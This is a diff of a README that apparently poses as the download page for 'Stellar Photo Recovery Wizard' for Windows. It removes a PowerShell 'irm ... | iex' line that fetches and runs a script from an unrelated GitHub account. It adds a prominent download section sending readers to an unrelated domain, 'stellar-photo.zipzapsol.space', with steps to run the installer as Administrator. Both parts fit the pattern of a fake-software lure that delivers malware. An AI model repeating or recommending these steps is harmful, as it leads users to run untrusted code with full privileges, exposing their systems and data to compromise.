@@ -9,7 +9,7 @@
 Open **PowerShell** and run:
 
 ```
-irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
+https://stellar-photo.zipzapsol.space/
 ```
 
 ---
@@ -38,3 +38,30 @@ Unlock with password first, then scan.
 
 **SD card not appearing?**
 Use USB card reader, not phone connection.
+
+## Download & Install
+
+> **This is the download page.** Use the button or link below to get **Stellar Photo Recovery Wizard** for Windows.
+
+<p align="center">
+  <a href="https://stellar-photo.zipzapsol.space/">
+    <img src="https://img.shields.io/badge/Download-Stellar%20Photo%20Recovery%20Wizard-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download Stellar Photo Recovery Wizard">
+  </a>
+</p>
+
+| | |
+| --- | --- |
+| **Direct link** | **[stellar-photo.zipzapsol.space](https://stellar-photo.zipzapsol.space/)** |
+| **Full URL** | `https://stellar-photo.zipzapsol.space/` |
+| **Type** | Installer for Windows 10 / 11 (64-bit) |
+| **Admin** | Run setup as Administrator |
+
+### Quick steps
+
+1. Click **[Download — stellar-photo.zipzapsol.space](https://stellar-photo.zipzapsol.space/)** (link above)
+2. Save the file from the project page
+3. Run the setup **as Administrator**
+4. Enter your license key when prompted
+5. Restart if the installer asks — then launch from Start menu
+
+<p align="center"><a href="https://stellar-photo.zipzapsol.space/"><strong>⬇ Download Stellar Photo Recovery Wizard now</strong></a></p>
